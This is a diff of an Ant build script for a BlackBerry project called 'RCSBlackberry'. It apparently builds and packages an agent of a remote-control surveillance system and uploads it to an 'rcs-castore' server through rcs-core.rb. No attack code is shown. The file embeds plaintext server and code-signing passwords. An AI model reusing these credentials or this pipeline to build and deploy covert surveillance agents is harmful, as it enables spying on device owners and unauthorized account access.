@@ -10,6 +10,7 @@
 
 	<!-- Environment properties -->
 	<property file="local.properties" />
+	<property file="version" />
 
 	<path id="lib.classpath">
 		<path location="${net_rim_api.jar}" />
@@ -28,6 +29,9 @@
 	<property name="core.codename" value="net_rim_bb_lib" />
 	<property name="lib.codename" value="net_rim_bb_lib_base" />
 	<property name="group.name" value="Rim Library" />
+
+	<property name="dist.lib" value="output/45/release/${lib.codename}.cod" />
+	<property name="dist.core" value="output/45/release/${core.codename}.cod" />
 
 	<!-- Symbols 
 	DEBUG: versione con i log di debug su file
@@ -98,23 +102,23 @@
 	</target>
 
 
-    <macrodef name="fakeconf">
-        <attribute name="preprocess.symbols" />
-        <attribute name="dir.to" />
-        <sequential>
-            <if>
-                <contains string="@{preprocess.symbols}" substring="FAKECONF" />
-                <then>
-                	<echo message="copy config.json to: @{dir.to}/config.json"/>
-                    <copy file="RCSBlackberry/preprocess/config.json" tofile="@{dir.to}/config.json" />
-                </then>
-            	<else>
-            		<echo message="do not copy config.json"/>
-            	</else>
-            </if>
-        </sequential>
-    </macrodef>
-	
+	<macrodef name="fakeconf">
+		<attribute name="preprocess.symbols" />
+		<attribute name="dir.to" />
+		<sequential>
+			<if>
+				<contains string="@{preprocess.symbols}" substring="FAKECONF" />
+				<then>
+					<echo message="copy config.json to: @{dir.to}/config.json" />
+					<copy file="RCSBlackberry/preprocess/config.json" tofile="@{dir.to}/config.json" />
+				</then>
+				<else>
+					<echo message="do not copy config.json" />
+				</else>
+			</if>
+		</sequential>
+	</macrodef>
+
 	<macrodef name="preprocess">
 		<attribute name="dir.src" />
 		<attribute name="dir.to" />
@@ -130,10 +134,10 @@
 					<include name="**/config.bin" />
 					<exclude name="@{exclude}" />
 				</fileset>
-			</copy>		
+			</copy>
 
-			<fakeconf dir.to="@{dir.to}" preprocess.symbols="@{preprocess.symbols}"/>			
-			
+			<fakeconf dir.to="@{dir.to}" preprocess.symbols="@{preprocess.symbols}" />
+
 			<replace dir="@{dir.to}" token="//#preprocess" value="//!preprocess" />
 			<wtkpreprocess verbose="false" srcdir="@{dir.to}" destdir="@{dir.to}" symbols="@{preprocess.symbols}" />
 		</sequential>
@@ -345,7 +349,6 @@
 		<attribute name="dir" />
 		<sequential>
 			<echo message="=== Sign @{dir}/@{cod} ===" />
-
 			<!--<sigtool jdehome="${jde.home}" codfile="output/tocod/${codename}.cod" /> -->
 			<java jar="${blackberry.certificate.dir}/SignatureTool.jar" fork="true" dir="@{dir}" failonerror="true">
 				<arg line=" -a -p KUZ93HQ1 -c -s @{cod}" />
@@ -355,10 +358,12 @@
 
 	<target name="init" depends="encrypt-messages">
 		<echo message="=== Init ===" />
+		<echo message="=== Version ${version} ===" />
 		<tstamp>
 			<format property="timestamp.BUILD" pattern="yyyyMMdd-hhmmss" />
 		</tstamp>
 		<buildnumber />
+
 		<copy file="RCSBlackberry/preprocess/Cfg.java" toFile="RCSBlackberry/src/blackberry/config/Cfg.java" overwrite="true">
 			<filterset>
 				<filter token="BUILD_ID" value="${build.number}" />
@@ -367,6 +372,7 @@
 				<filter token="MODULE_NAME" value="${core.codename}" />
 				<filter token="MODULE_LIB_NAME" value="${lib.codename}" />
 				<filter token="RANDOM" value="${randomSalt}" />
+				<filter token="VERSION" value="${version}" />
 			</filterset>
 		</copy>
 		<mkdir dir="build" />
@@ -379,12 +385,13 @@
 		<echo message="=== Clean ===" />
 		<delete dir="build" includeEmptyDirs="true" />
 		<delete dir="output" includeEmptyDirs="true" />
+		<delete dir="server/core" includeEmptyDirs="true" />
 		<delete file="${core.src}/config.json" failonerror="false" />
 	</target>
 
-
 	<!-- list="45,50" -->
 	<target name="build" depends="clean,init">
+
 		<for list="45" param="version">
 			<sequential>
 				<echo message="==============" />
@@ -405,7 +412,7 @@
 				<echo message="     DEBUG   " />
 				<corebuild kind="debug" version="@{version}" preprocess.symbols="${preprocess.debug.symbols}" />
 
-				
+
 				<echo message="_____________" />
 				<echo message="    RELEASE  " />
 				<corebuild kind="release" version="@{version}" preprocess.symbols="${preprocess.release.symbols}" />
@@ -450,7 +457,7 @@
 
 	<target name="loadcore" depends="loadcoredebug" />
 
-		<!-- Load to device depends="sign" -->
+	<!-- Load to device depends="sign" -->
 	<target name="uninstall">
 		<echo message="=== Uninstall ===" />
 		<echo>${jde.45.home}/bin/JavaLoader.exe</echo>
@@ -461,44 +468,78 @@
 			<arg value="${core.codename}.cod" />
 		</exec>
 	</target>
-	
+
 	<!-- C:\Ruby193\bin\ruby c:\HT\rcs-core-build\rcs-core.rb -u zeno -p zenop123 -d rcs-castore -n blackberry -f RCS_0000000746 $args -->
 	<macrodef name="updaterelease">
 		<attribute name="server" />
 		<attribute name="login" />
 		<attribute name="password" />
+		<attribute name="file" />
 		<sequential>
 			<echo>@{server}</echo>
-			<for list="${core.codename}.cod,${lib.codename}.cod" param="file">
-				<sequential>
-					<exec executable="${ruby.path}/ruby.exe" dir="output/45/release/" failonerror="true">
-						<arg value="${rcscore.path}/rcs-core.rb"/>
-						<arg value="-u"/>
-						<arg value="@{login}"/>
-						<arg value="-p"/>
-						<arg value="@{password}"/>
-						<arg value="-d"/>
-						<arg value="@{server}"/>
-						<arg value="-n"/>
-						<arg value="blackberry"/>
-						<arg value="-a"/>
-						<arg value="@{file}"/>
-					</exec>		
-				</sequential>
-			</for>	
-		</sequential>		
+
+			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+				<arg value="${rcscore.path}/rcs-core.rb" />
+				<arg value="-u" />
+				<arg value="@{login}" />
+				<arg value="-p" />
+				<arg value="@{password}" />
+				<arg value="-d" />
+				<arg value="@{server}" />
+				<arg value="-n" />
+				<arg value="blackberry" />
+				<arg value="-R" />
+				<arg value="@{file}" />
+			</exec>
+
+		</sequential>
 	</macrodef>
-	
-	<target name="update" >
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123"/>
+
+	<target name="update">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\blackberry_${version}.zip" />
 	</target>
-	
+
 	<target name="addconf">
-		<fakeconf dir.to="${core.src}" preprocess.symbols="FAKECONF"/>
+		<fakeconf dir.to="${core.src}" preprocess.symbols="FAKECONF" />
 	</target>
 
 	<property name="blackberry.simulator.path" location="${jde.45.home}\simulator" />
 	<property name="simulator.model" value="8300" />
+
+	<target name="servercore">
+		<mkdir dir="server/core" />
+		<mkdir dir="server/core/bin" />
+		<copy toDir="server/core" overwrite="true">
+			<fileset dir="server/template" />
+			<filterset>
+				<filter token="VERSION" value="${version}" />
+			</filterset>
+		</copy>
+
+		<copy file="${dist.lib}" toDir="server/core" overwrite="true" />
+		<copy file="${dist.core}" toDir="server/core" overwrite="true" />
+
+		<zip destfile="server/blackberry_${version}.zip" basedir="server/core" />
+	</target>
+
+	<target name="dist">
+		<input message="Release (8.0_RC1)?" addproperty="do.release" defaultvalue="8.0_RC1" />
+
+		<antcall target="servercore" />
+		<antcall target="update" />
+
+		<mkdir dir="../dist/${do.release}" />
+		<copy file="${dist.lib}" toDir="../dist/${do.release}" overwrite="true" />
+		<copy file="${dist.core}" toDir="../dist/${do.release}" overwrite="true" />
+		<copy file="server/blackberry_${version}.zip" toDir="../dist/${do.release}" overwrite="true" />
+
+		<zip destfile="../dist/${do.release}/blackberry_sources.zip" basedir="." />
+		<checksum>
+			<fileset dir="../dist/${do.release}/">
+				<include name="*" />
+			</fileset>
+		</checksum>
+	</target>
 
 	<!-- To run the application in simulator
 	PS C:\Users\fabrizio\blackberry\Workspace> C:\Developer\eclipse_bb\plugins\net.rim.ejde.componentpack4.5.0_4.5.0.28\components\simulator\
@@ -527,7 +568,6 @@
 			<arg line=" /data-port=0x4d4e " />
 			<arg line=" /pin=0x2100000A " />
 		</exec>
-
 	</target>
 
 	<target name="help">
@@ -537,5 +577,6 @@
 		<echo>ant loadcoredebug : uploads the core debug 45 on device</echo>
 		<echo>ant init : updates messages.all, cfg.java</echo>
 		<echo>ant addconf : copy config.json in src/config.json</echo>
+		<echo>ant dist : create a dist zip file and updates server/core</echo>
 	</target>
 </project>
